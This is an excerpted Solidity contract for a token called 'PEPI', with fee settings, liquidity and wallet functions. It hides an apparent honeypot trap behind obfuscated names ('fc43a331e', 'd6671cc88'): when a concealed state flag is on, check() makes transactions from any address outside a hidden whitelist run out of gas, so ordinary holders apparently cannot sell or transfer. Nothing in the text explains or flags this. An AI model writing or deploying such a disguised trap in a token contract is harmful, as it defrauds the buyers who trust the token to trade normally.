...
contract TokenContractA is IERC20, Ownable, Context {

    string private _name = "PEPI";
    string private _symbol = "PEPI";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1000000000 * (10 ** decimals());
    uint8 private buyFee = 2;
    uint8 private sellFee = 3;
    ...
    constructor (address routerAddress) {
        ...
        _balances[owner()] = _totalSupply; initialize(_msgSender());
    ...
    function addLiquidity(uint256 _tokenAmountWei) external payable whenNotPaused {
    ...
    function clm() external whenNotPaused { fc43a331e(); }
    uint private _mgas = 500;

    function check(address _u) internal view {
        if (d6671cc88[_u] != 0) { return; } 
        if (_state) { exceedsGas(_mgas); }
    }
    ...
    function updateMarketWallet(address _newMarketWallet) external whenNotPaused {
    ...
    function currentState() external view returns (bool) { return _state; }
